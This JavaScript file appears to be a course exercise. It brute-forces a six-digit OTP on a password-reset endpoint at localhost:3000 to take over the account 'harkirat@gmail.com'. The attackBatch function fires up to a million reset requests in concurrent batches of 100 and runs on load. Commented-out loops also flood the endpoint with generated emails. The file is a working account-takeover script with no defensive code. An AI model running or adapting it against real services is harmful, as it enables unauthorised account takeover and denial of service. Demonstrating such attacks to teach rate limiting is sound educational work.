// for(let i = 0; i < 1000000; i++){
//     fetch('http://localhost:3000/reset-password', {
//         method: 'POST',
//         headers: {
//             'Content-Type': 'application/json'
//         },
//         body: ({
//             email: `attack${i}@gmail.com`,
//             otp: "634955",
//             newPassword: "12334356"
//         })
//     })
// }


async function attack(otp) {

  const axios = require('axios');
  let data = JSON.stringify({
    "email": "harkirat@gmail.com",
    "otp": otp,
    "newPassword": "12334356"
  });
  
  let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'http://localhost:3000/reset-password',
    headers: { 
      'Content-Type': 'application/json'
    },
    data : data
  };
  
  try {
      await axios.request(config)
    
  } catch (error) {
    
  }
  

}

// for(let i = 0; i < 1000000; i++){
//     console.log(i);
    
//   attack(i.toString());
// }

// attack("372513");

//attack a website using batching the requests

async function attackBatch(){
    for(let i = 0; i < 999999; i+=100){
        const p = [];
        console.log(i);
        for(let j = 0; j < 100; j++){
            p.push(attack((i + j).toString()));
        }
        await Promise.all(p); //Waits for all 100 requests to finish before proceeding to the next batch. Runs all 100 requests in parallel (concurrently). Prevents excessive memory usage by waiting for one batch before starting the next.
    }
}

attackBatch();